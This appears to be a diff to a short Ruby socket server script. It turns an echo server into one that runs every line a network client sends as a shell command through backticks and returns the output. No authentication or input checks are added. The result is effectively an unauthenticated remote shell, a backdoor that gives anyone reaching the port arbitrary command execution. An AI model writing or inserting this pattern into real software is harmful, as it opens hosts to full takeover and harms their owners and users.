@@ -1,7 +1,7 @@
 #!/usr/bin/env ruby
 # encoding: UTF-8
 
-require "socket"
+require 'socket'
 
 class Server
   def initialize(port, ip)
@@ -20,9 +20,18 @@ class Server
   def process(client)
     loop {
       request = client.gets.chomp
-      response = "#{request} OK"
+      request.force_encoding('UTF-8').encode!(Encoding.default_external)
 
       puts request
+
+      begin
+        response = `#{request}`.chomp
+      rescue => e
+        response = e
+      end
+
+      response.encode!('UTF-8')
+
       puts response
 
       client.puts response
